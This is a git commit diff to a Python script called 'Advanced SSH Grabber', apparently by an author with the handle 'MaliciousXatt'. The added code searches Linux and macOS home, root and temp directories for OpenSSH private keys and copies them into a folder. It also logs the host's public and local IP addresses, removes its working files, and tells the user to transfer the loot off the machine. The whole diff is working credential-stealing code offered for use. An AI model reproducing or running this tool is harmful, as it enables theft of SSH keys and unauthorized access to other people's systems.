cbed4e68ec77fd5b2712051466aef292dd226882
xatt <111096156+MaliciousXatt@users.noreply.github.com>
2022-12-14 16:03:14 +0100

    Add files via upload

--- Advanced_SSH_Grabber.py
+++ Advanced_SSH_Grabber.py
@@ -16,17 +16,33 @@ def filecheck():
 if platform == "linux" and x.lower() == "y":
     print("You are using the Advanced SSH Grabber by XATT.")
     print(f"OS detected: {platform}.")
-    os.system('find / -name .ssh > SSHlocations.txt; find / -name *.pub >> SSHlocations.txt')
+    os.system('echo "" > SSHlocations.txt')
+    os.system('find /home /root /tmp -type f -exec grep -l "BEGIN OPENSSH" {} > SSHlocations.txt \;')
+    os.system('mkdir sshfiles')
     with open("SSHlocations.txt" , "r") as f:
         lines = f.readlines()
         for line in lines:
             line = line.strip()
             print(line)
+            os.system(f'cp -r {line} sshfiles')
+    if filecheck() == 0:
+        print("No files detected\n")
+        q = input("Do you want to run SSH-gen? Y / N\n")
+        if q.lower() == "y":
+            os.system("""HOSTNAME=`hostname` ssh-keygen -t rsa -C "$HOSTNAME" -f "sshfiles/id_rsa" -P "" && cat ~/sshfiles/id_rsa.pub""")
+            print("Done.\n No password required.")
+        else:
+            exit()
+    os.system('curl ifconfig.me > sshfiles/PublicIP.txt; ifconfig > sshfiles/LocalIP.txt')
+    print("Cleaing up.")
+    os.system('rm -rf SSHlocations.txt; rm -rf 1.log')
+    print("Done, transfer the 'sshfiles' folder to your system.")
+
 elif platform == "darwin" and x.lower() == "y":
     print("You are using the Advanced SSH Grabber by XATT.")
     print(f"OS detected: {platform}.")
     os.system('echo "" > SSHlocations.txt')
-    os.system('find / -name "*.pub" -o -name ".ssh" -o -name "id_rs*" -o -name "id_ds*" -o -name "*ecds* -o -name "*D2551*" -o -name "SSH-1" > SSHlocations.txt')
+    os.system('find /home /Users /tmp -type f -exec grep -l "BEGIN OPENSSH" {} > SSHlocations.txt \;')
     os.system('mkdir sshfiles')
     with open("SSHlocations.txt" , "r") as f:
         lines = f.readlines()
@@ -49,3 +65,4 @@ elif platform == "darwin" and x.lower() == "y":
 elif platform == "win32" and x.lower() == "y":
     print("You are using the Advanced SSH Grabber by XATT.")
     print(f"OS detected: {platform}.")
+    print("This platform is not supported yet.")
